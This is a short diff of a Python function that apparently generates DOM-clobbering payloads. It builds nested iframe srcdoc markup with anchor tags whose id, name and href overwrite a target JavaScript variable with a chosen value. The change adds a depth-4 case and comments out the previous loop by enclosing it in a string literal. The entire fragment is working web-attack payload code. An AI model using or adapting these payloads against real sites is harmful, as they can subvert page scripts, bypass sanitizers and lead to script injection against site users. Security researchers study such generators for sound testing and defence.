@@ -97,18 +97,25 @@ def gen_payloads(variable_name, variable_value):
                 )
 
             if "iframe" in ALLOWED_ELEMENTS:
-                payload = f"""<iframe name="{items[0]}" srcdoc="<iframe name='{items[1]}' srcdoc='<iframe name={items[2]} srcdoc="""
+                if depth == 4:
+                    payload = f"""<iframe name="{items[0]}" srcdoc="<iframe name='{items[1]}' srcdoc='"""
+                    payload += f"<a id={items[2]}></a><a id={items[2]} name={items[3]} href={variable_value}></a>"
+                    payload += """'></iframe>"</iframe>"""
+
+
+                """
                 for i, item in enumerate(items):
                     if i == len(items) - 1:
-                        payload += f"""<a id={items[i - 1]}>""".replace(" ", "&amp;amp;#x20")
+                        payload += f""<a id={items[i - 1]}>"".replace(" ", "&amp;amp;#x20")
                     elif i == len(items) - 2:
-                        payload += f"""<a id={item} name={items[i + 1]} href={variable_value}>""".replace(
+                        payload += f""<a id={item} name={items[i + 1]} href={variable_value}>"".replace(
                             " ", "&amp;amp;#x20"
                         )
                     elif i > 2:
                         pass
+                """
 
-                payload += """'></iframe>"</iframe>"""
+                # payload += """'></iframe>"</iframe>"""
                 payloads.append(payload)
 
     payloads = [payload.replace('"', QUOTE_CHAR) for payload in payloads]
